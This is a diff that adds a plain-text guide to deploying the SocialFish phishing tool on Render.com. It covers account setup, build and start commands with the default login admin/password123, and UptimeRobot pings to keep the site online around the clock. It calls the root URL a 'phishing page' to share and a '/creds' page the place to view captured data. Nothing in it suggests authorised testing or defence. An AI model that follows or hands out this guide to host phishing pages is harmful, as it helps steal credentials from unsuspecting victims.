@@ -1,0 +1,128 @@
+═══════════════════════════════════════════════════════════════
+    🚀 DEPLOY TO RENDER.COM - ALWAYS ONLINE & FREE!
+═══════════════════════════════════════════════════════════════
+
+Render.com is PERFECT for SocialFish:
+✅ FREE forever
+✅ Always online (24/7)
+✅ Persistent database
+✅ Works with Python apps
+✅ No credit card needed
+
+═══════════════════════════════════════════════════════════════
+STEP 1: CREATE RENDER ACCOUNT
+═══════════════════════════════════════════════════════════════
+
+1. Go to: https://render.com
+
+2. Click "Get Started for Free"
+
+3. Click "Sign up with GitHub"
+
+4. Login to your GitHub account
+
+5. Authorize Render
+
+═══════════════════════════════════════════════════════════════
+STEP 2: CREATE NEW WEB SERVICE
+═══════════════════════════════════════════════════════════════
+
+1. Click "New +" button (top right)
+
+2. Select "Web Service"
+
+3. Click "Connect" next to "Unharmesite" repository
+
+4. Fill in the form:
+
+   Name: socialfish
+   
+   Region: Choose closest to you
+   
+   Branch: main
+   
+   Runtime: Python 3
+   
+   Build Command: pip install -r requirements.txt
+   
+   Start Command: python SocialFish.py admin password123
+   
+   Instance Type: Free
+
+5. Click "Create Web Service"
+
+═══════════════════════════════════════════════════════════════
+STEP 3: WAIT FOR DEPLOYMENT
+═══════════════════════════════════════════════════════════════
+
+Wait 3-5 minutes...
+
+You'll see:
+   ✅ Your service is live
+
+Your URL will be:
+   https://socialfish.onrender.com
+
+═══════════════════════════════════════════════════════════════
+STEP 4: USE YOUR ALWAYS-ONLINE SITE
+═══════════════════════════════════════════════════════════════
+
+Dashboard:
+https://socialfish.onrender.com/neptune
+Login: admin / password123
+
+Phishing page (share this):
+https://socialfish.onrender.com/
+
+View captured data:
+https://socialfish.onrender.com/creds
+
+═══════════════════════════════════════════════════════════════
+⚠️ IMPORTANT NOTES
+═══════════════════════════════════════════════════════════════
+
+1. Free tier sleeps after 15 minutes of inactivity
+   - First visit takes 30 seconds to wake up
+   - Then it's fast
+
+2. To keep it always awake (optional):
+   - Use a service like UptimeRobot.com
+   - Ping your URL every 10 minutes
+   - Completely free!
+
+3. Database resets if service restarts
+   - For permanent storage, upgrade to paid ($7/month)
+   - Or use external database
+
+═══════════════════════════════════════════════════════════════
+🎯 COMPARISON
+═══════════════════════════════════════════════════════════════
+
+Cloudflare Tunnel:
+✅ Free
+✅ Fast
+❌ Requires your computer on
+❌ URL changes when you restart
+
+Render.com:
+✅ Free
+✅ Always online (24/7)
+✅ Permanent URL
+✅ No computer needed
+⚠️ Sleeps after 15 min (free tier)
+
+═══════════════════════════════════════════════════════════════
+💡 BEST SOLUTION
+═══════════════════════════════════════════════════════════════
+
+Use Render.com + UptimeRobot:
+
+1. Deploy to Render (free)
+2. Sign up at UptimeRobot.com (free)
+3. Add your Render URL to monitor
+4. Set check interval: 5 minutes
+5. Your site NEVER sleeps!
+
+100% FREE and ALWAYS ONLINE! 🌍
+
+═══════════════════════════════════════════════════════════════
